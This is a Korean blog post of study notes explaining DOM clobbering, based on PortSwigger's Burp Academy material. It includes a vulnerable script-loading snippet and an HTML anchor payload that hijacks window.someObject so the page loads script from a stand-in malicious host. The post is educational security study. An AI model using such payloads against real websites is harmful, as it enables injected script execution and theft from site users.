---
layout: post
title: "Dom Clobbering 정리"
categories: [웹 취약점, Dom Clobbering, Dom 클로버링]
tags: [웹 취약점, Dom Clobbering, Dom 클로버링, Burp Academy]
toc: true
---

# 개요
- `Dom clobbering(돔 클로버링)` 취약점이 뭔지 정리하면서 이해해본다. 
- Dom clobbering이라는 이름은 Burp Suite 의 웹 브라우저 확장 프로그램인 Dom Invader에서 처음 봤다. 
- Dom clobbering도 XSS와 마찬가지로 취약점(또는 공격테크닉)의 한 종류라고 볼 수 있다. 
- clobbering(클로버링)이란 영단어 자체는 "(사람을)두들겨 패다", "(특히 경제적으로) 호된 처벌(손실)을 가하다"라는 뜻이 있다고 한다. 
- Dom을 두들겨 패는(?) 공격인가했는데, [위키피디아](https://en.wikipedia.org/wiki/Clobbering){:target="_blank"}에 의하면 컴퓨터 쪽에서 클로버링이라고 하면 "덮어쓰기"를 의미한다고 한다. 
- 따라서 Dom클로버링은 Dom의 동작을 덮어쓰기 하는 공격이라고 대충 예상할 수 있겠다. 

# 돔 클로버링이란?
- Burp Academy 의 설명을 보면 다음과 같이 되어 있다. 

```
DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page.
```

다음은 구글 번역. 

```
DOM 클로버링은 페이지에 HTML을 삽입하여 DOM을 조작하고 궁극적으로 페이지에서 JavaScript의 동작을 변경하는 기술입니다.
```

- 삽입한 HTML로 DOM을 조작하고, 궁극적으로는 페이지의 Javascript 동작을 변경한다! Javascript 동작을 변경한다면 결과적으로 XSS와 동일한 것을 할 수 있을 것 같다. 
- 실제로 XSS자체는 불가능하지만 id, name과 같은 HTML의 일부 속성을 변경할 수 있는 경우에 사용할 수 있는 테크닉이라고 한다. 
- 가장 전형적인 예는, 글로벌 변수를 덮어쓰기 위해서 앵커 엘렌먼트(a 태그)를 사용하는 것이라고 한다. 
- 그리고 이 앵커 엘레먼트가 웹 어플리케이션에서 안전하지 않게 사용되면(예를들어 다이내믹 script URL을 만드는등) 공격이 가능하다는 것 같다. 
- Dom 객체를 덮어쓰는 것으로 다른 자바스크립트 객체를 덮어쓰기 하는 것이 가능하다고 한다. 
- 예를들어, submit과 같은 이름을 덮어쓰면, HTML페이지의 Submit()함수의 동작을 변경할 수 있다! (어떻게 이런게 가능할까?)

# 어떻게 DOM-clobbering 취약점을 공격(exploit) 할 수 있는가?
예를 들어 어떤 페이지에 HTML을 삽입할 수가 있고, 이 페이지의 자바스크립트 코드는 다음과 같다고 하자. 

```js
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

이 페이지에 다음과 같은 HTML을 삽입하면 어떻게 될까?

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

두 개의 앵커 엘레먼트가 같은 ID(someObject)를 사용하고 있다. DOM은 이 두개를 DOM 컬렉션으로 그룹화한다. DOM 클로버링 벡터는 이 DOM 컬렉션으로 someObject(위의 자바스크립트 코드 `window.someObject` 를 보자.)의 참조를 덮어쓴다! name 속성은 someObject 객체의 url 속성을 덮어쓰기 위해 사용된다. 

오...아주 흥미롭다. 이 공격이 성립하려면 자바스크립트가 실행되기 전에 DOM 삽입(HTML삽입)이 먼저 이루어져야 할 것 같다. 먼저 DOM삽입이 이루어지면, 자바스크립트에서 참조하는 someObject는 삽입한 DOM의 somObject 컬렉션을 가리키게 될 것이다. 그리고 동적으로 script 엘레먼트가 생성되고, 이 script의 src속성은 somObject의 url 속성의 값(//malicious-website.com/evil.js)으로 채워진다. 그리고 이 script 엘레먼트는 HTML페이지의 body부분에 추가된다! 

그런데 앵커 엘레먼트가 왜 두 개가 있어야하지? 한개만 있으면 안되는 건가? 뭔가 이유가 있을 것 같다. 한번 실제로 테스트해보자. 위의 샘플 코드가 실제로 잘 동작하는지. 그리고 앵커 엘레먼트가 하나있을 때와 두개있을 때 어떻게 다른지.



# 참고 링크
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://intadd.tistory.com/143 (한글 포스팅은 여기밖에 없는 것 같다.)

